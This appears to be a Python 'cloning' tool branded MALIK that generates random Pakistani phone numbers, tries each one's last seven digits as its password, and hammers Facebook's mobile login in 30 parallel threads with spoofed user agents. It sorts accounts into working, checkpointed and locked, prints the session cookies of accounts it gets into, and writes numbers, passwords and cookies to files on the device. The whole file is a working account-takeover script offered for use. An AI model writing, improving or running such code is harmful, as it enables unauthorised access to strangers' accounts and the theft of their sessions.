from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
import os,sys,time,json,random,re,string,platform,base64,platform,uuid
import marshal
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures==2 > /dev/null')
    os.system('python Kashif.py')
from bs4 import BeautifulSoup
ugen = []
A = '\x1b[1;97m' 
B = '\x1b[1;96m' 
C = '\x1b[1;91m' 
D = '\x1b[1;92m'
M = '\033[1;31m'
H = '\033[1;32m'
N = '\x1b[1;37m'    
E = '\x1b[1;93m' 
F = '\x1b[1;94m'
G = '\x1b[1;95m'
P = '\033[1;37m'
RED = '\033[1;91m'
GREEN = '\033[1;97m'
GREEN = '\033[1;32m' #
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
KB = '{ KB }'
for xd in range(10000):
    a='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['6','7','8','9','10','11','12'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=f'{a} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
try:
    os.system('curl https://bacho1001.blogspot.com/2022/07/ua.html -o ua.html')
except:
    pass
sock=open('ua.html','r').read().splitlines()
def uaku():
    try:
        ua=open('bbnew.txt','r').read().splitlines()
        for ub in ua:
            ugen.append(ub)
    except:
        a=requests.get('https://bacho1001.blogspot.com/2022/07/ua.html').text
        ua=open('.user-agents.txt','w')
        aa=re.findall('line">(.*?)<',str(a))
        for un in aa:
            ua.write(un+'\n')
        ua=open('.user-agents.txt','r').read().splitlines()
        

#<------[main-ua]---->
def riazfile():
    END = '[FBAN/FB4A;FBAV/43.0.0.29.147;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/14274161;FBCR/Google;FBMF/Linux;FBBD/linux;FBDV/F1;FBSV/5.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=720,height=1280};FB_FW/1;]'
    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; linux Build/TP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
    return ua
#<------[userugrnt]----->
def riazfilee():
    END = '[FBAN/FB4A;FBAV/256.0.0.17.157;FBBV/298672900;FBPN/com.facebook.katana;FBLC/en_US;FBCR/zncl;FBMF/vivo;FBBD/vivo;FBDV/vivo;FBSV/9;FBOP/1;FBCA/armeabi-v8a:armeabi;FBDM/{density=2.0,width=718,height=1492};]'
    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; vivo Build/TP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
    return ua
    
loop = 0
cps = []
oks = []
twf = [] 

def clear():
    os.system('clear')
logo =("""\x1b[1;97m 
\033[1;34m
     ███    ███  █████  ██      ██ ██   ██ 
     ████  ████ ██   ██ ██      ██ ██  ██  
     ██ ████ ██ ███████ ██      ██ █████   
     ██  ██  ██ ██   ██ ██      ██ ██  ██  
     ██      ██ ██   ██ ███████ ██ ██   ██ \x1b[1;97m 
 
\33[1;31m═══════════════════════════════════════════════\x1b[1;97m 
\033[1;37m[✓] AUTHOR        : MALIK G
\033[1;37m[✓] VERSION       : V1
\33[1;31m═══════════════════════════════════════════════\x1b[1;97m 
\033[1;32m     BACK AFTER LONG TIME \033[1;97m
\33[1;31m═══════════════════════════════════════════════\x1b[1;97m """ )

 
#####     #### 

def linex():
    print(f'\33[1;31m═══════════════════════════════════════════════\x1b[1;97m ')
def checks(oks,cps,twf):
    if not len(oks) != 0:
        pass
    if len(cps) != 0:
        print('\n\n\x1b[1;97m TOTAL OK : \x1b[1;97m %s  ' % (
            H, P, str(len(oks))))
        print('\x1b[1;97m TOTAL CP :\x1b[1;97m   %s ' %
              (H, P, str(len(cps))))
        print('\x1b[1;97m TOTAL 2F :\x1b[1;97m   %s ' %
              (H, P, str(len(twf))))
        input("\x1b[1;97mPRESE ENTER TO BACK   ")
        xyz()
loop = 0
cps = []
oks = []
twf = []
def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r %s[%s!%s] %s{ORANGE}SORRY THERE IS NO ACTIVE  APKS ðŸŽ®%s  '%(ORANGE))
    else:
        print(f'\r {GREEN}[MALIK] %sYOUR ACTIVE APPLICATION DETAILS :'%(GREEN))
        for i in range(len(game)):
            print(f"\r%s[%s] %s %s "%(N,i+1,game[i]. replace("Ditambahkan pada"," Ditambahkan pada"),N))
        #else:
            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r %s[%s!%s] %s{ORANGE}SORRY THERE IS NO EXPIRED APKS ðŸŽ®%s'%(ORANGE))
    else:
        print(f'\r ðŸŽ®  %{RED}sYOUR EXPIRED APKS DETAILS :'%(RED))
        for i in range(len(game)):
            print(f"\r%s[%s] %s %s "%(N,i+1,game[i]. replace("Kedaluwarsa"," Kedaluwarsa"),N))
            print(f"\33[1;31m═══════════════════════════════════════════════\x1b[1;97m ")
    #____________#
def MALIK():
    #os.system("play-audio WELCOME_TO_kb_BOOT_818.mp3")
    os.getuid
    os.system("clear");print(logo)
    print(f"[01] RANDOM CLONING PAK")
    print(f"[00] EXIT MALIK TOOL ")
    print(f"\33[1;31m═══════════════════════════════════════════════")
    Kashif = input(" -// CHOOSE : ")
    if Kashif in ["1","01"]:
        Random()
    elif Kashif in ["0","00"]:
       exit()
    else:
        print('\033[1;31mINCORRECT OPTION!\033[1;31m')
        xyz()

#_____________#
 
#_____________________#

def Random():
    user=[]
    os.getuid
    os.geteuid
    os.system("clear")
    print(logo)
    print(f"")
    clear()
    print(logo)
    print(' [=] CODE EX : 0306 ,0300 ,0315 ,0333')
    print('\33[1;31m═══════════════════════════════════════════════\x1b[1;97m ')
    code = input(' -// YOUR CODE  : ')
    os.system("clear")
    print(logo)
    print (' [=] EX : 1000, 2000, 5000, 10000')
    print ('\33[1;31m═══════════════════════════════════════════════\x1b[1;97m ')
    limit = int(input(' -// ENTER LIMIT : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:    
        clear()       
        tl = str(len(user))
        print(logo)
        print(f" -// TOTAL ACCOUNTS : "+tl)
        print(f" -// CHOICE CODE    : "+code)
        print(f" -// MALIK TOOL HAS BEEN STARTED ")
        print(f'\33[1;31m═══════════════════════════════════════════════\x1b[1;97m ')
        for love in user:
            uid = code+love
            pwx = [love]
            yaari.submit(free,uid,pwx,tl)
def free(uid,pwx,tl):
    global loop
    global oks
    global agents
    try:
        for ps in pwx:
            bi = random.choice([A])
            session = requests.Session()
            pro = random.choice(ugen)
            uaa1  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+"[FBAN/FB4A;FBAV/368.0.0.24.108;FBBV/371897983;FBDM/{density=1.0,width=600,height=976};FBLC/en_US;FBCR/null;FBMF/JTYjay;FBBD/D101;FBPN/com.facebook.katana;FBDV/D101;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]"
            free_fb = session.get('https://m.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
			"try_number":"0",
			"unrecognized_tries":"0",
			"email":uid,
			"pass":ps,
			"login":"Log In"}
            header_freefb = {
    'authority': 'p.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'sec-ch-ua': '"Chromium";v="90", "Google Chrome";v="90", "Microsoft Edge";v="90"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': uaa1,
    'connection': 'keep-alive',
    'cache-control': 'no-cache',
    'accept-encoding': 'gzip, deflate, br',
}

            lo = session.post('https://p.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                uid = coki[151:166]
                print('\033[1;32m• SUCCESS >>  ' +uid+ ' | ' +ps+    '\033[0;97m')
                print(f"{H} [🍪] {coki}")
                open('/sdcard/MALIK-OK.txt', 'a').write(uid+' | '+ps+' | '+coki+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                uid = coki[141:156]
                print('\33[1;31m• DEAD >>  ' +uid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/MALIK-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            elif '/x/checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                uid = coki[141:156]
                print('\33[1;31m• LOCKED  ' +uid+ ' | ' +ps+           '  \33[0;97m')
                #open('/sdcard/MALIK-CP.txt', 'a').write( uid+' | '+ps+' \n')
                twf.append(uid)
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r -// [MALIK-XD] %s|\x1b[1;92mOK:-%s \x1b[1;97m\r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass

        
 
if __name__ == '__main__':
    MALIK()